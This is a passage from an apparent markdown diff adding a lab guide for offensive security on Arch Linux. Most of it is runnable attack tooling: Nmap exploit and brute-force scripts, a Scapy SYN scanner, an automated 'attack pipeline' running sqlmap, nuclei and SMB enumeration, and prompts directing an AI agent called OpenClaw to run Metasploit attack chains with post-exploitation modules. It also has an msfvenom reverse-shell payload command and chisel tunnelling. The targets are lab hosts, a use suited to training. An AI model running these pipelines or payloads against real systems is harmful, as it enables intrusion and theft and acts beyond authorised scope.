+  -c ~/ai-security-lab/tools/datasets/wordlists/SecLists/Discovery/SNMP/snmp.txt \
+  192.168.56.101 \
+  | tee ~/ai-security-lab/scans/network/snmp_communities.txt
+
+# ── SNMP system info ──
+snmpwalk -v2c -c public 192.168.56.101 system
+snmpwalk -v2c -c public 192.168.56.101 hrSWInstalledName  # Installed software
+snmpwalk -v2c -c public 192.168.56.101 interfaces          # Network interfaces
+```
+
+### 6.2 Nmap NSE Full Exploitation
+
+```bash
+# Full vulnerability scan with NSE scripts
+sudo nmap \
+  -sV --script="vuln,exploit,auth,default,brute" \
+  -p 21,22,23,25,53,80,110,139,143,443,445,512,513,514,1524,2049,2121,3306,5432,5900,6000,6667,8009,8180 \
+  -oA ~/ai-security-lab/scans/nmap/full_vuln_$(date +%Y%m%d) \
+  192.168.56.101
+
+# Specific dangerous NSE scripts
+sudo nmap --script "smb-vuln-*" -p 445 192.168.56.101
+sudo nmap --script "ftp-*" -p 21 192.168.56.101
+sudo nmap --script "ssh-*" -p 22 192.168.56.101
+sudo nmap --script "http-shellshock" -p 80 192.168.56.101
+sudo nmap --script "http-phpmyadmin-dir-traversal" -p 80 192.168.56.101
+```
+
+### 6.3 Scapy — Packet Crafting
+
+```python
+# Save as: ~/ai-security-lab/scripts/scanning/scapy_recon.py
+# Run: python3 scapy_recon.py
+
+from scapy.all import *
+
+TARGET = "127.0.0.1"
+
+# ── SYN scan ──
+def syn_scan(target, ports):
+    print(f"[*] SYN scanning {target}")
+    open_ports = []
+    for port in ports:
+        pkt = IP(dst=target)/TCP(dport=port, flags="S")
+        resp = sr1(pkt, timeout=1, verbose=0)
+        if resp and resp.haslayer(TCP) and resp[TCP].flags == 0x12:
+            open_ports.append(port)
+            print(f"  [OPEN] Port {port}")
+            sr1(IP(dst=target)/TCP(dport=port, flags="R"), timeout=1, verbose=0)
+    return open_ports
+
+# ── ICMP ping ──
+def icmp_ping(target):
+    pkt = IP(dst=target)/ICMP()
+    resp = sr1(pkt, timeout=2, verbose=0)
+    if resp:
+        print(f"[✓] {target} is UP")
+        return True
+    print(f"[!] {target} is DOWN")
+    return False
+
+# ── ARP scan ──
+def arp_scan(network):
+    print(f"[*] ARP scan on {network}")
+    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), timeout=2, verbose=0)
+    hosts = []
+    for _, rcv in ans:
+        print(f"  {rcv.psrc} — {rcv.hwsrc}")
+        hosts.append(rcv.psrc)
+    return hosts
+
+if __name__ == "__main__":
+    if icmp_ping(TARGET):
+        ports = range(1, 1025)
+        syn_scan(TARGET, ports)
+```
+
+---
+
+## PART 7 — AUTOMATED FULL ATTACK PIPELINE
+
+### 7.1 Full Recon → Attack → Report Script
+
+```bash
+cat > ~/ai-security-lab/scripts/automation/full_kali_attack.sh << 'FULLEOF'
+#!/usr/bin/env bash
+# OpenClaw — Full Kali-Grade Attack Pipeline
+# Authorized lab targets ONLY
+
+set -euo pipefail
+TARGET="${1:-localhost}"
+MODE="${2:-web}"   # web | network | full
+DATE=$(date +%Y%m%d_%H%M%S)
+LAB="$HOME/ai-security-lab"
+OUT="$LAB/scans"
+REPORT="$LAB/reports/pentest/kali_attack_${TARGET}_${DATE}.md"
+
+CYAN='\033[0;36m'; RED='\033[0;31m'; GREEN='\033[0;32m'; NC='\033[0m'
+banner() { echo -e "\n${CYAN}████ $1 ████${NC}"; }
+ok() { echo -e "${GREEN}[✓] $1${NC}"; }
+warn() { echo -e "${RED}[!] $1${NC}"; }
+
+# Confirm authorization
+banner "🦅 Full Attack Pipeline"
+echo "  Target : $TARGET"
+echo "  Mode   : $MODE"
+echo "  Date   : $DATE"
+echo ""
+warn "AUTHORIZED LAB ENVIRONMENTS ONLY"
+read -p "  Confirm this is an authorized target? (yes/no): " CONFIRM
+[[ "$CONFIRM" != "yes" ]] && echo "Aborted." && exit 1
+
+mkdir -p "$OUT"/{nmap,nuclei,web-scans,network} "$LAB/reports/pentest"
+
+# ─── PHASE 1: Nmap ───
+banner "Phase 1 — Port Scan"
+sudo nmap -sV -sC -T3 "$TARGET" \
+  --min-rate 500 \
+  -oA "$OUT/nmap/full_${DATE}" \
+  2>/dev/null
+ok "Nmap complete → $OUT/nmap/full_${DATE}.nmap"
+
+# ─── PHASE 2: Service fingerprinting ───
+banner "Phase 2 — WhatWeb"
+whatweb -v "http://$TARGET" \
+  --log-verbose "$OUT/web-scans/whatweb_${DATE}.txt" 2>/dev/null || true
+ok "WhatWeb done"
+
+# ─── PHASE 3: Directory brute force ───
+if [[ "$MODE" == "web" || "$MODE" == "full" ]]; then
+  banner "Phase 3 — Feroxbuster"
+  WORDLIST="$LAB/tools/datasets/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt"
+  if [[ -f "$WORDLIST" ]]; then
+    feroxbuster \
+      --url "http://$TARGET" \
+      --wordlist "$WORDLIST" \
+      --extensions php,html,txt,bak \
+      --threads 20 \
+      --depth 3 \
+      --quiet \
+      --output "$OUT/web-scans/feroxbuster_${DATE}.txt" 2>/dev/null || true
+    ok "Feroxbuster done"
+  else
+    warn "SecLists not found — run openclaw-install first"
+  fi
+fi
+
+# ─── PHASE 4: Vulnerability scan ───
+banner "Phase 4 — Nuclei Vuln Scan"
+nuclei \
+  -u "http://$TARGET" \
+  -tags owasp,sqli,xss,lfi,rce,cve \
+  -severity low,medium,high,critical \
+  -rate-limit 30 \
+  -o "$OUT/nuclei/vuln_${DATE}.txt" \
+  2>/dev/null || true
+ok "Nuclei done"
+
+# ─── PHASE 5: SQLMap ───
+if [[ "$MODE" == "web" || "$MODE" == "full" ]]; then
+  banner "Phase 5 — SQLMap (DVWA)"
+  if [[ "$TARGET" == "localhost" || "$TARGET" == "127.0.0.1" ]]; then
+    sqlmap \
+      -u "http://$TARGET/vulnerabilities/sqli/?id=1&Submit=Submit" \
+      --cookie="security=low" \
+      --dbs \
+      --batch \
+      --output-dir="$OUT/web-scans/sqlmap_${DATE}/" \
+      --random-agent 2>/dev/null || warn "SQLMap: target may not be DVWA"
+    ok "SQLMap done"
+  fi
+fi
+
+# ─── PHASE 6: Network attacks ───
+if [[ "$MODE" == "network" || "$MODE" == "full" ]]; then
+  banner "Phase 6 — Network Enumeration"
+  nmap --script "smb-enum-shares,smb-enum-users,ftp-anon" \
+    -p 21,22,23,445,139 \
+    -oN "$OUT/network/nse_${DATE}.txt" \
+    "$TARGET" 2>/dev/null || true
+  ok "NSE network scripts done"
+
+  enum4linux-ng -A "$TARGET" \
+    -oJ "$OUT/network/enum4linux_${DATE}.json" 2>/dev/null || true
+  ok "Enum4linux-ng done"
+fi
+
+# ─── PHASE 7: Generate report ───
+banner "Phase 7 — Report Generation"
+NMAP_RESULT=$(cat "$OUT/nmap/full_${DATE}.nmap" 2>/dev/null | tail -30)
+NUCLEI_RESULT=$(cat "$OUT/nuclei/vuln_${DATE}.txt" 2>/dev/null | head -30)
+FEROX_COUNT=$(cat "$OUT/web-scans/feroxbuster_${DATE}.txt" 2>/dev/null | grep -c "200\|301" || echo 0)
+
+cat > "$REPORT" << REPORT_TEMPLATE
+# Kali-Grade Attack Report
+| Field     | Value           |
+|-----------|-----------------|
+| Target    | $TARGET         |
+| Date      | $DATE           |
+| Mode      | $MODE           |
+| Analyst   | OpenClaw Agent  |
+
+## Port Scan Summary
+\`\`\`
+$NMAP_RESULT
+\`\`\`
+
+## Web Directories Found
+Count: $FEROX_COUNT URLs discovered (200/301 responses)
+Full results: \`$OUT/web-scans/feroxbuster_${DATE}.txt\`
+
+## Vulnerabilities Found (Nuclei)
+\`\`\`
+$NUCLEI_RESULT
+\`\`\`
+
+## Evidence Files
+| Type        | Path |
+|-------------|------|
+| Nmap        | $OUT/nmap/full_${DATE}.* |
+| WhatWeb     | $OUT/web-scans/whatweb_${DATE}.txt |
+| Feroxbuster | $OUT/web-scans/feroxbuster_${DATE}.txt |
+| Nuclei      | $OUT/nuclei/vuln_${DATE}.txt |
+| SQLMap      | $OUT/web-scans/sqlmap_${DATE}/ |
+| Network     | $OUT/network/ |
+
+## Recommendations
+1. Patch all critical/high CVEs identified by Nuclei
+2. Disable default credentials on all services
+3. Restrict SMB/FTP to authorized hosts only
+4. Enable WAF and input validation
+5. Upgrade all outdated service versions
+REPORT_TEMPLATE
+
+ok "Report: $REPORT"
+banner "🦅 Attack Pipeline Complete"
+echo "  Report: $REPORT"
+FULLEOF
+
+chmod +x ~/ai-security-lab/scripts/automation/full_kali_attack.sh
+echo 'alias kali-attack="~/ai-security-lab/scripts/automation/full_kali_attack.sh"' >> ~/.bashrc
+source ~/.bashrc
+```
+
+---
+
+## PART 8 — AI INTEGRATION
+
+### 8.1 OpenClaw Attack Mode Prompt
+
+After installing all tools, ask OpenClaw to orchestrate:
+
+```bash
+openclaw
+```
+
+Then type:
+```
+Run a full web attack against http://localhost (DVWA lab).
+Start with feroxbuster recon, then nuclei scan, then sqlmap injection on the sqli endpoint.
+Use security=low cookie. Save all results to ~/ai-security-lab/scans/.
+Generate a markdown pentest report when done.
+```
+
+Or for network attacks:
+```
+Run a full Metasploit attack chain against 192.168.56.101 (Metasploitable2 lab).
+Use the resource file at ~/ai-security-lab/scripts/automation/openclaw_msf_attack.rc.
+After getting sessions, run post modules for network and system enumeration.
+Generate an incident report template for the findings.
+```
+
+### 8.2 Tool Availability Checker
+
+```bash
+cat > ~/ai-security-lab/scripts/automation/check_tools.sh << 'CHECKEOF'
+#!/usr/bin/env bash
+# OpenClaw — Kali Tool Availability Checker
+
+TOOLS=(
+  nmap masscan wireshark nikto sqlmap hydra john hashcat
+  aircrack-ng msfconsole msfvenom burpsuite
+  nuclei subfinder httpx dnsx naabu katana ffuf gobuster dalfox
+  gau waybackurls feroxbuster dirsearch wpscan
+  crackmapexec smbmap enum4linux-ng impacket-smbclient
+  responder netexec evil-winrm
+  whatweb wafw00f sslscan wfuzz
+  socat chisel proxychains4
+  autorecon theHarvester dnsrecon fierce recon-ng
+  snmpwalk onesixtyone
+  scapy python3 go cargo
+)
+
+MISSING=()
+OK=()
+echo "=== Kali Tool Availability Check ==="
+for tool in "${TOOLS[@]}"; do
+  if command -v "$tool" &>/dev/null; then
+    echo -e "  \033[0;32m[✓]\033[0m $tool"
+    OK+=("$tool")
+  else
+    echo -e "  \033[0;31m[✗]\033[0m $tool — NOT FOUND"
+    MISSING+=("$tool")
+  fi
+done
+
+echo ""
+echo "═══════════════════════════════════════"
+echo "  Available : ${#OK[@]}"
+echo "  Missing   : ${#MISSING[@]}"
+if [[ ${#MISSING[@]} -gt 0 ]]; then
+  echo ""
+  echo "  To install missing tools:"
+  echo "  bash ~/ai-security-lab/scripts/automation/openclaw_install_kali_tools.sh"
+fi
+echo "═══════════════════════════════════════"
+CHECKEOF
+
+chmod +x ~/ai-security-lab/scripts/automation/check_tools.sh
+echo 'alias check-tools="~/ai-security-lab/scripts/automation/check_tools.sh"' >> ~/.bashrc
+```
+
+---
+
+## QUICK REFERENCE — FULL KALI COMMAND SET
+
+```bash
+# ─── INSTALL ALL TOOLS ──────────────────────────
+bash ~/ai-security-lab/scripts/automation/openclaw_install_kali_tools.sh
+
+# ─── CHECK TOOL AVAILABILITY ────────────────────
+check-tools
+
+# ─── RUN FULL ATTACK PIPELINE ───────────────────
+kali-attack localhost web          # Full web attack on DVWA
+kali-attack 192.168.56.101 network # Network attack on Metasploitable2
+kali-attack localhost full         # Both web + network
+
+# ─── INDIVIDUAL TOOLS ───────────────────────────
+# Recon
+autorecon 192.168.56.101
+theHarvester -d target.lab -b all
+katana -u http://localhost -d 5
+gau yourtarget.lab
+
+# Web
+feroxbuster --url http://localhost --threads 30
+dalfox url "http://localhost/xss?name=test"
+wpscan --url http://localhost:8888 --enumerate vp
+whatweb -v http://localhost
+wafw00f http://localhost
+
+# Network
+crackmapexec smb 192.168.56.0/24
+enum4linux-ng -A 192.168.56.101
+smbmap -H 192.168.56.101
+snmpwalk -v2c -c public 192.168.56.101
+
+# Exploitation
+msfconsole -r ~/ai-security-lab/scripts/automation/openclaw_msf_attack.rc
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o revshell.elf
+
+# Tunneling
+chisel server --reverse --port 9000
+proxychains nmap -sT -Pn 10.10.10.1
+
+# Payloads
+python3 ~/ai-security-lab/tools/exploitation/PEASS-ng/linPEAS/linpeas.sh
+```
+
+---
+
+*Kali-Grade Attack Ops — Arch Linux | Authorized Labs Only*
